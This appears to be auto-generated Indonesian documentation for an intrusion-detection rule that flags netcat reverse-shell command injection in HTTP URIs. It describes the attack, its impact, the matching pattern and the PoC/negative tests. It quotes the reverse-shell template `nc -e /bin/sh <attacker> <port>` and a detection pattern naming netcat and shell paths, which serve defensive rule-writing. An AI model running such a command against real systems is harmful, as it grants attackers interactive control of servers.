# SID 9120010 — WEB CMDi netcat -e reverse shell (nc/ncat -e /bin/sh) in http.uri

> Auto-generated by `scripts/gen-docs` from `tests/poc/_descriptions.json` + rule metadata. **Jangan edit di sini** — edit JSON-nya lalu jalankan `scripts/gen-docs`.

**Rule:** `rules/plaintext/cmdi.rules` · **Confidence:** high · **OWASP:** A03-Injection · **Severity:** Critical · **Network:** plain

## Serangan apa ini?
Pasca command injection, penyerang panggil `nc -e /bin/sh <attacker> <port>` — idiom reverse-shell klasik (juga `ncat -e`, varian distro).

## Kalau kena, dampaknya?
Reverse shell penuh ke server penyerang — kendali shell interaktif terhadap server target.

## Apa yang rule ini deteksi?
`nc -e` / `ncat -e` + path shell (`/bin/sh|bash|dash|zsh`) + IP/hostname + port di URL — high conf, tanpa threshold.

## PoC vs Negative
- `poc.sh` → **harus** memicu SID 9120010.
- `negative.sh` → lookalike jinak; kena fast_pattern lalu **ditolak pcre** → TIDAK alert (§19 T6).

## Cara jalanin
```
scripts/rulectl check 9120010
```
